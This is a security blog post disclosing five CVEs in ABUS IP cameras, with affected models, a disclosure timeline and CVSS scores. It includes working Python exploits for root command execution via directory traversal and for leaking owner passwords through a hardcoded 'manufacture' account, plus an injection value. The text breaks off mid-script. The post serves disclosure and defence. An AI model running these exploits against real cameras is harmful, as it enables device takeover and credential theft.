<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Five Vulnerabilities in ABUS cameras :: sec.maride.cc</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Background It was a chill friday evening when Ilias, Alexander and myself sat around our local hackspace Chaosdorf, ate some pizza and played around with the ABUS security camera we were able to get in our hands shortly before. As the company has quite some reputation in Germany, we assumed that there wouldn&amp;rsquo;t be much to find security-wise, also because this camera was one of the most expensive ones in the consumer market." />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="/posts/abus/" />






  
  
  
  
  
  <link rel="stylesheet" href="/styles.css">







  <link rel="shortcut icon" href="/favicon.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Five Vulnerabilities in ABUS cameras">
<meta property="og:description" content="Background It was a chill friday evening when Ilias, Alexander and myself sat around our local hackspace Chaosdorf, ate some pizza and played around with the ABUS security camera we were able to get in our hands shortly before. As the company has quite some reputation in Germany, we assumed that there wouldn&amp;rsquo;t be much to find security-wise, also because this camera was one of the most expensive ones in the consumer market." />
<meta property="og:url" content="/posts/abus/" />
<meta property="og:site_name" content="sec.maride.cc" />

  
    <meta property="og:image" content="/favicon.png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2018-12-31 13:33:37 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <link rel="stylesheet" href="/css/heads.css"><link rel="stylesheet" href="/css/eigengrau.css">

<header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    sec.maride.cc
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;â¾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about">About me</a></li>
        
      
        
          <li><a href="/cves">CVEs</a></li>
        
      
        
          <li><a href="/tags/lab/">Lab Notes</a></li>
        
      
        
          <li><a href="/tools">Tools</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about" >About me</a></li>
        
      
        
          <li><a href="/cves" >CVEs</a></li>
        
      
        
          <li><a href="/tags/lab/" >Lab Notes</a></li>
        
      
        
          <li><a href="/tools" >Tools</a></li>
        
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="/posts/abus/">Five Vulnerabilities in ABUS cameras</a>
  </h1>
  <div class="post-meta"><time class="post-date">2018-12-31</time></div>

  
    <span class="post-tags">
      
      #<a href="/tags/cve/">cve</a>&nbsp;
      
    </span>
  
  


  
    <div class="table-of-contents">
      <h2>
        Table of Contents
      </h2>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#background">Background</a></li>
    <li><a href="#objective">Objective</a></li>
    <li><a href="#timeline">Timeline</a></li>
    <li><a href="#vulnerabilities">Vulnerabilities</a>
      <ul>
        <li><a href="#cve-2018-16739">CVE-2018-16739</a></li>
        <li><a href="#cve-2018-17558">CVE-2018-17558</a></li>
        <li><a href="#cve-2018-17879">CVE-2018-17879</a></li>
        <li><a href="#cve-2018-17878">CVE-2018-17878</a></li>
        <li><a href="#cve-2018-17559">CVE-2018-17559</a></li>
      </ul>
    </li>
    <li><a href="#overall-evaluation--conclusion">Overall Evaluation &amp; Conclusion</a></li>
  </ul>
</nav>
    </div>
  

  <div class="post-content"><div>
        <h2 id="background">Background<a href="#background" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>It was a chill friday evening when <a href="https://twitter.com/A2nkF_">Ilias</a>, <a href="https://twitter.com/twink0r">Alexander</a> and myself sat around our local hackspace <a href="https://chaosdorf.de">Chaosdorf</a>, ate some pizza and played around with the ABUS security camera we were able to get in our hands shortly before. As the company has quite some reputation in Germany, we assumed that there wouldn&rsquo;t be much to find security-wise, also because this camera was one of the most expensive ones in the consumer market. Little did we know that we&rsquo;d get our first CVEs and security fame that evening as well&hellip;</p>
<h2 id="objective">Objective<a href="#objective" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<blockquote>
<p>August Bremicker und SÃ¶hne KG, commonly known as ABUS, is a German manufacturer of preventative security technology based in Wetter, North Rhine-Westphalia.</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/ABUS">Wikipedia</a></li>
</ul>
</blockquote>
<p>While ABUS is mostly focusing on physical security technology like door locks and chains, security cameras are also an important branch of their portfolio. Those cameras are bought from a <a href="https://www.oxfordlearnersdictionaries.com/definition/english/white-label">white-label</a> producer, branded and sold. In this case, the affected cameras were produced by taiwanese producer Grain Media with the GM812X chipset.</p>
<p>This means that the discovered vulnerabilities were not necessarily ABUS&rsquo; fault, as they didn&rsquo;t develop the firmware. They could&rsquo;ve conducted penetration tests though.</p>
<p>Affected by the vulnerabilities are the model numbers / lines:</p>
<ul>
<li>Compact Cameras
<ul>
<li>TVIP10000</li>
<li>TVIP10001</li>
<li>TVIP10005</li>
<li>TVIP10005A</li>
<li>TVIP10005B</li>
<li>TVIP10050</li>
<li>TVIP10051</li>
<li>TVIP10055A</li>
<li>TVIP10055B</li>
<li>TVIP10500</li>
<li>TVIP10550</li>
<li>TVIP11000</li>
<li>TVIP11050</li>
<li>TVIP11500</li>
<li>TVIP11501</li>
<li>TVIP11502</li>
<li>TVIP11550</li>
<li>TVIP11551</li>
<li>TVIP11552</li>
</ul>
</li>
<li>Cameras with movable head
<ul>
<li>TVIP20000</li>
<li>TVIP20050</li>
<li>TVIP20500</li>
<li>TVIP20550</li>
<li>TVIP21000</li>
<li>TVIP21050</li>
<li>TVIP21500</li>
<li>TVIP21501</li>
<li>TVIP21502</li>
<li>TVIP21550</li>
<li>TVIP21551</li>
<li>TVIP21552</li>
<li>TVIP22500</li>
</ul>
</li>
<li>Dome cameras
<ul>
<li>TVIP31000</li>
<li>TVIP31001</li>
<li>TVIP31050</li>
<li>TVIP31500</li>
<li>TVIP31501</li>
<li>TVIP31550</li>
<li>TVIP31551</li>
<li>TVIP32500</li>
</ul>
</li>
<li>Box cameras
<ul>
<li>TVIP51500</li>
<li>TVIP51550</li>
</ul>
</li>
<li>Outside dome cameras
<ul>
<li>TVIP71500</li>
<li>TVIP71501</li>
<li>TVIP71550</li>
<li>TVIP71551</li>
<li>TVIP72500</li>
</ul>
</li>
</ul>
<p>Those cameras were sold from 2010 to 2014.</p>
<h2 id="timeline">Timeline<a href="#timeline" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<ul>
<li>XX-09-2018: Discovery of vulnerabilities in lab environment</li>
<li>XX-09-2018: Communication with <a href="https://ccc.de/">CCC e.V.</a> for disclosure handling</li>
<li>26-11-2018: Initial contact with ABUS, no response</li>
<li>18-02-2019: Start of responsible disclosure process with ABUS</li>
<li>03-05-2019: Public Announcement by ABUS for a replacement program</li>
<li>07-05-2019: Publication of <a href="https://www.ccc.de/en/updates/2019/update-nicht-verfugbar-hersteller-nicht-zu-erreichen">CCC blogpost</a></li>
</ul>
<p>This disclosure was picked up by German press shortly after: <a href="https://www.heise.de/news/Sicherheitsluecken-in-IP-Kameras-Abus-bietet-Tauschprogramm-4419944.html">Heise</a>, <a href="https://www.golem.de/news/abus-ueberwachungskameras-austauschprogramm-statt-update-1905-141133.html">Golem</a>, <a href="https://www.spiegel.de/netzwelt/gadgets/abus-kameras-hersteller-bietet-wegen-sicherheitsluecken-austausch-an-a-1266524.html">SPIEGEL Online</a></p>
<h2 id="vulnerabilities">Vulnerabilities<a href="#vulnerabilities" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="cve-2018-16739">CVE-2018-16739<a href="#cve-2018-16739" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Authenticated read and write access through directory traversal with command execution</p>
<h4 id="description">Description<a href="#description" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Through directory traversal it is possible to utilize the file browser of the web frontend, which seems to be only for displaying file server content, for arbitrary read, write and execution. The browser can be used to read and write files outside the file server directory and to list the contents of any directory. This is done with root privileges.</p>
<p>The affected endpoints are:</p>
<ul>
<li><code>/cgi-bin/admin/fileread?READ.filePath=&lt;Path&gt;</code> to read the specified file</li>
<li><code>/cgi-bin/admin/filewrite?SAVE.filePath=&lt;Path&gt;</code> to write to the specified file</li>
<li><code>/cgi-bin/admin/sdstate?action=filelistnas&amp;directory=&lt;Path&gt;</code> to list a directory</li>
</ul>
<h4 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>For arbitrary read and write, the exploitation of the endpoints is as simple as it gets, by prefixing the desired path with <code>../../../../</code> or by specifying an absolute path.</p>
<p>A trick is required to move from arbitrary write to code execution: if a bash script is placed in the CGI scripts folder of the web server and this script is called via a web browser, the shell script is executed with root privileges. This is also the trick applied on the POC exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> huepy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;exploit-16739&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;url&#39;</span>, type<span style="color:#f92672">=</span>str, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;target url including port, eg http://127.0.0.1:8080&#39;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;cmd&#34;</span>, type<span style="color:#f92672">=</span>str, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;the cmd to exec, e.g. &#39;ls /&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    referenceID <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1000</span>, <span style="color:#ae81ff">9999</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>cyan(<span style="color:#e6db74">&#34;[~] Exploit for CVE-2018-16739&#34;</span>))
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>cyan(<span style="color:#e6db74">&#34;    Your reference number is </span><span style="color:#e6db74">%i</span><span style="color:#e6db74">.&#34;</span> <span style="color:#f92672">%</span> (referenceID)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    prepareShell(args<span style="color:#f92672">.</span>url, referenceID, args<span style="color:#f92672">.</span>cmd)
</span></span><span style="display:flex;"><span>    execCmd(args<span style="color:#f92672">.</span>url, referenceID)
</span></span><span style="display:flex;"><span>    readCmd(args<span style="color:#f92672">.</span>url, referenceID)
</span></span><span style="display:flex;"><span>    mrproper(args<span style="color:#f92672">.</span>url, referenceID)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">prepareShell</span>(target, refID, cmd):
</span></span><span style="display:flex;"><span>    writeCmd(target, refID, <span style="color:#e6db74">&#34;#!/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> 1&gt;/tmp/</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">.log 2&gt;&amp;1&#34;</span> <span style="color:#f92672">%</span> (cmd, refID))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">writeCmd</span>(target, refID, cmd):
</span></span><span style="display:flex;"><span>    percentCmd <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(cmd)
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>yellow(<span style="color:#e6db74">&#34;[~] writing /opt/cgi/admin/</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">.sh&#34;</span> <span style="color:#f92672">%</span> (refID)))
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/cgi-bin/admin/filewrite?SAVE.filePath=/opt/cgi/admin/</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">.sh&amp;SAVE.fileData=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (target, refID, percentCmd), verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execCmd</span>(target, refID):
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>yellow(<span style="color:#e6db74">&#34;[~] Executing reference number </span><span style="color:#e6db74">%i</span><span style="color:#e6db74">...&#34;</span> <span style="color:#f92672">%</span> (refID)))
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/cgi-bin/admin/</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">.sh&#34;</span> <span style="color:#f92672">%</span> (target, refID), verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">readCmd</span>(target, refID):
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/cgi-bin/admin/fileread?READ.filePath=/tmp/</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">.log&#34;</span> <span style="color:#f92672">%</span> (target, refID), verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>green(<span style="color:#e6db74">&#34;[+] Command returned on </span><span style="color:#e6db74">%i</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (refID)) <span style="color:#f92672">+</span>  r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mrproper</span>(target, refID):
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>green(<span style="color:#e6db74">&#34;[+] mrproper-ing your waste...&#34;</span>))
</span></span><span style="display:flex;"><span>    writeCmd(target, refID, <span style="color:#e6db74">&#34;#!/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">rm /tmp/</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">.log /opt/cgi/admin/</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">.sh&#34;</span> <span style="color:#f92672">%</span> (refID, refID))
</span></span><span style="display:flex;"><span>    execCmd(target, refID)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Note that, as the OS injection itself is blind, log output of your command(s) needs to be written into a log file and read again after the command finishes. This means that if your command runs for an hour, you&rsquo;ll only be able to get the output after an hour.</p>
<h4 id="evaluation">Evaluation<a href="#evaluation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>CVSS v2: <a href="https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:L/Au:S/C:C/I:C/A:C)">AV:N/AC:L/Au:S/C:C/I:C/A:C</a> = Base Score <strong>9.0</strong></p>
<h3 id="cve-2018-17558">CVE-2018-17558<a href="#cve-2018-17558" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Hardcoded administrator account with code execution as root</p>
<h4 id="description-1">Description<a href="#description-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>The web server is protected against unauthorized access by a user name and password, which can be changed by the person who purchased the camera. This is <code>admin:12345</code> or <code>admin:admin</code> by default, dependent on software and model. This is dangerous in itself, since an attacker can exploit the fact that the owner of the camera usually does not change this password.</p>
<p>Regardless of the initial values for the admin user account, the web server is also configured to accept the user name <code>manufacture</code> with the password <code>erutcafunam</code> for the <code>/cgi-bin/mft</code> directory in the web server&rsquo;s root directory. These values cannot be deleted by the owner of the camera, nor can they be changed. This means that all cameras running with the affected software versions can be accessed using this user name and password.</p>
<p>There are several endpoints in the <code>/cgi-bin/mft</code> directory. These endpoints are responsible for changing the WiFi settings of the device. These can be attacked at various points through an OS injection to execute code with root privileges:</p>
<p><img src="17558.png" alt="Screenshot of X86 assembly"></p>
<h4 id="evaluation-1">Evaluation<a href="#evaluation-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>If the <code>manufacture</code> user account is combined with the input attack, it is possible to execute arbitrary code as root on the camera from outside, even if the owner of the camera has chosen secure passwords. These are simply bypassed.</p>
<p>CVSS v2: <a href="https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:L/Au:N/C:C/I:C/A:C)">AV:N/AC:L/Au:N/C:C/I:C/A:C</a> = Base Score <strong>10.0</strong></p>
<h4 id="exploitation-1">Exploitation<a href="#exploitation-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Obviously, using the hard-coded credentials for your purposes is as easy as it gets.</p>
<p>Bringing together the puzzle pieces &ldquo;hardcoded credentials&rdquo; and &ldquo;OS injection&rdquo; gives you endless possibilities; one of them is to leak out the (user-managed) credentials:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> huepy
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;exploit-17558&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;ip&#39;</span>, type<span style="color:#f92672">=</span>str, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;target IP, eg 127.0.0.1&#39;</span>)
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>cyan(<span style="color:#e6db74">&#34;[~] Exploit for CVE-2018-17558&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    copyCreds(args<span style="color:#f92672">.</span>ip) <span style="color:#f92672">and</span> showCreds(args<span style="color:#f92672">.</span>ip) <span style="color:#f92672">and</span> delCreds(args<span style="color:#f92672">.</span>ip)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">copyCreds</span>(target):
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>yellow(<span style="color:#e6db74">&#34;[~] Copying creds&#34;</span>))
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://manufacture:erutcafunam@</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/cgi-bin/mft/wireless_mft?ap=&lt;/invalid;cp</span><span style="color:#e6db74">%%</span><span style="color:#e6db74">20/var/www/secret.passwd</span><span style="color:#e6db74">%%</span><span style="color:#e6db74">20/web/html/leakedcredentials&#34;</span> <span style="color:#f92672">%</span> (target), verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(huepy<span style="color:#f92672">.</span>green(<span style="color:#e6db74">&#34;[+] SUCCESSFUL!&#34;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(huepy<span style="color:#f92672">.</span>red(<span style="color:#e6db74">&#34;[-] Failed. Server is not vulnerable...&#34;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">showCreds</span>(target):
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>yellow(<span style="color:#e6db74">&#34;[~] Here are the credentials of </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (target)))
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/leakedcredentials&#34;</span> <span style="color:#f92672">%</span> (target), verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(huepy<span style="color:#f92672">.</span>green(<span style="color:#e6db74">&#34;[+] SUCCESSFUL! Here you go:&#34;</span>))
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Rights</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">| Password</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">|&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;0000&#34;</span> <span style="color:#f92672">in</span> line:
</span></span><span style="display:flex;"><span>                parts <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">| </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">|&#34;</span> <span style="color:#f92672">%</span> (parts[<span style="color:#ae81ff">0</span>], base64<span style="color:#f92672">.</span>b64decode(parts[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(huepy<span style="color:#f92672">.</span>red(<span style="color:#e6db74">&#34;[-] Failed. Server is not vulnerable...&#34;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delCreds</span>(target):
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>yellow(<span style="color:#e6db74">&#34;[~] Cleaning up&#34;</span>))
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://manufacture:erutcafunam@</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/cgi-bin/mft/wireless_mft?ap=&lt;/invalid;rm</span><span style="color:#e6db74">%%</span><span style="color:#e6db74">20/web/html/leakedcredentials&#34;</span> <span style="color:#f92672">%</span> (target), verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(huepy<span style="color:#f92672">.</span>green(<span style="color:#e6db74">&#34;[+] Successful. Thanks for your cooperation.&#34;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(huepy<span style="color:#f92672">.</span>red(<span style="color:#e6db74">&#34;[-] Failed. Server is not vulnerable...&#34;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><h3 id="cve-2018-17879">CVE-2018-17879<a href="#cve-2018-17879" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Remote code execution through OS injection</p>
<h4 id="description-2">Description<a href="#description-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>The <code>/cgi-bin/</code> directory contains several scripts that are used to control and configure the camera. Among other tasks, these scripts are responsible for changes to the camera&rsquo;s image settings (contrast, color values, brightness) or the network settings of the device. The attack is based on the fact that some of the scripts do not check input that comes from the user and are passed directly to the <code>system()</code> command. If control characters are used to spoof the user input, arbitrary C ode can be executed. For example, such an input could look like this: <code>$(shutdown -h now)</code>. This would shut down the camera from the outside. An attacker could use this to completely take over the camera, attack the internal network (private or corporate), launch further attacks from the camera, as well as change, pause or delete the camera&rsquo;s image, and completely disable the camera.</p>
<h4 id="exploitation-2">Exploitation<a href="#exploitation-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>As simple as wrapping a reverse shell code in <code>$(...)</code>.</p>
<p>See this exploit, where the injection happens in the <code>UPnP HTTP Port</code> field:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> huepy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;exploit-17879&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;url&#39;</span>, type<span style="color:#f92672">=</span>str, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;target url including port, eg http://127.0.0.1:8080&#39;</span>)
